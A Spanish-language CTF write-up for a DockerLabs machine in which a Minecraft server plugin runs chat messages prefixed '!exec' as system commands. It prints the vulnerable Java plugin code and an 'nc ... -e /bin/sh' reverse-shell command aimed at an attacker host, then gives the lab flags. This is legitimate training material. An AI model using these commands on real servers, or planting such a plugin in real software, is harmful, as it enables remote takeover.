# 📑 Writeup: Máquina DockHackLab 🚀

![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)


# Escaneo de puertos
```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>


nmap -sCV -p 172.17.0.2 <IP>
Info:

Copy
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 04:23 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000037s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Apache httpd 2.4.58 ((Ubuntu))
|_http-generator: HTTrack Website Copier/3.x
|_http-title: Local index - HTTrack Website Copier
|_http-server-header: Apache/2.4.58 (Ubuntu)
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds
Veremos varias cosas interesantes, entre ellas que hay un Minecraft corriendo en el servidor, pero antes de entrar a el, vamos a explorar la pagina web que esta alojada en el puerto 80, si entramos dentro de ella veremos una pagina web de Minecraft como un duplicado de la original en el que se puede realizar la compra del juego, etc... Pero eso no nos interesa, si inspeccionamos el codigo veremos lo siguiente en las ultimas lineas de codigo:
```
```bash

<!-- AutoExecPlugin.txt --> 
Veremos lo que parece ser un archivo .txt el cual vamos a probar si estuviera subido en el servidor.

URL = http://<IP>/AutoExecPlugin.txt

```

```ruby
Info:
package me.vuln.autoexec;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class AutoExecPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("AutoExecPlugin habilitado");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        Player player = event.getPlayer();

        // Detecta comando con prefijo !exec
        if (msg.startsWith("!exec ")) {
            event.setCancelled(true); // CANCELA que se muestre el mensaje en el chat

            String command = msg.substring(6); // Quitar "!exec " del mensaje

            try {
                // Ejecutar comando en la consola del servidor
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                StringBuilder output = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                proc.waitFor();

                // Enviar salida del comando al jugador que ejecutÃ³ el chat
                player.sendMessage("Â§c[Output]:\n" + output.toString());

            } catch (Exception e) {
                player.sendMessage("Â§4Error ejecutando comando: " + e.getMessage());
            }
        }
    }
}
```

Por lo que vemos si existe, esto es una clase de JAVA la cual nos esta dando una pista de que si esto estuviera en el servidor de minecraft como un plugin puede ser muy vulnerable ya que puede ejecutar comandos del sistema dentro del propio servidor del juego, por lo que vamos a descargarnos minecraft para meternos en dicho servidor.

# Instalación Minecraft (Gratis)
Vamos a ir al siguiente enlace en la pagina del TLauncher de Minecraft, es para jugar Minecraft gratis.
# URL -> https://tlauncher.org/

<img width="694" height="340" alt="image" src="https://github.com/user-attachments/assets/b200b6fa-8312-47c5-b495-6d1e8c0fe4bf" />

Le daremos a TLauncher for Linux para que nos lo descargue, esto nos descargara un .zip el cual vamos a extraer de esta forma.

```bash
cd /home/<USERNAME>/Download
unzip <FILE>.zip
```
Una vez extraido veremos lo siguiente en la carpeta llamada TLauncher.v16:

```bash
cd TLauncher.v16/
ls -la

Info:


Copy
total 9904
drwxrwxr-x 2 kali kali     4096 Jun 17 12:50 .
drwxr-xr-x 3 kali kali     4096 Jun 17 16:54 ..
-rw-rw-r-- 1 kali kali     2198 Dec 10  2024 README-EN.txt
-rw-rw-r-- 1 kali kali     3235 Dec 10  2024 README-RUS.txt
-rw-rw-r-- 1 kali kali 10121689 May  4 06:37 TLauncher.jar
```
Lo importante es el archivo TLauncher.jar que es el que inicia Minecraft por lo que tendremos que ejecutarlo de esta forma.


```java
java -jar tlauncher.jar
```
Esto instalara Minecraft y abrira el launcher para iniciarlo, dentro del mismo tendremos que elegir el nombre de usuario que puede ser cualquiera y muy importante la version, en el reporte de nmap vimos que la version es Minecraft 1.12.2 por lo que tendremos que elegir la llamada release 1.12.2 y darle a Install.

Eso instalara todo lo necesario para jugarla, una vez que se haya instalado todo nos pondra Enter the game le daremos y despues de un rato estaremos dentro del menu de Minecraft, nos iremos a la opcion llamada Multiplayer y dentro del mismo configuraremos el servidor de Miencraft desde donde esta corriendo la maquina victima.

Le daremos al boton llamado Add Server y dentro del mismo veremos el Server Name y el Server Address el que nos interesa es configurar el Server Adderess por lo que tendremos que poner la IP de la maquina victima junto con el puerto que es el 25565 quedando de esta forma:

<img width="637" height="459" alt="image" src="https://github.com/user-attachments/assets/d3561a21-b69d-4c95-9b08-635d282be131" />


Le daremos a Done y si refrescamos tendremos que ver el server activo asi:

<img width="606" height="183" alt="image" src="https://github.com/user-attachments/assets/4a581914-ba31-4a01-9770-4b9374b4976e" />


Ahora seleccionaremos el servidor y le daremos al boton llamado Join Server esto nos metera dentro del mundo de Minecraft del servidor.

# 🚀 3. Escalada de Privilegios y Explotación (RCE)

Una vez dentro del servidor de Minecraft, procedemos a enumerar los plugins instalados para confirmar la superficie de ataque:
Escalate Privileges
Una vez dentro del mundo vamos a probar a listar los plugins de esta forma desde Minecraft.
```bash
/pl
```
```ruby
Plugins (2): AutoOpPlugin, AutoExecPlugin
```

Vemos que esta el plugin que encontramos del .txt por lo que vamos a probar a ejecutar lo que mencionaba en el .txt para poder ejecutar comandos con !exec acompañado de un comando del sistema.

```ruby
!exec whoami
```
<img width="126" height="39" alt="image" src="https://github.com/user-attachments/assets/07cc219b-7c65-40f6-bf48-333cd8afe0bf" />

Vemos que se esta ejecutando de forma correcta podremos realizar un RCE, por lo que vamos a probar a generarnos una reverse shell de esta forma.


```ruby
!exec nc <IP_ATTACKER> <PORT> -e /bin/sh
```
Antes de ejecutarlo tendremos que ponernos a la escucha desde nuestra maquina host.
```ruby
nc -lvnp <IP>
```
Estando a la escucha si ejecutamos el comando anterior desde Minecraft y volvemos a donde tenemos la escucha veremos lo siguiente

```ruby
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 47064
whoami
root
```
Vemos que hemos obtenido de forma exitosa una shell desde la maquina victima mediante un plugin vulnerable desde Minecraft, sanitizaremos la shell.

# Sanitización de shell (TTY)
script /dev/null -c bash

Copy
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
Una vez echo esto leeremos la flag del usuario y de root.

user.txt
```
8725a65493f812597167d64cf85640e6
```


root.txt
```
ebcc53fe4fcaffea2fe32390021783c4
```
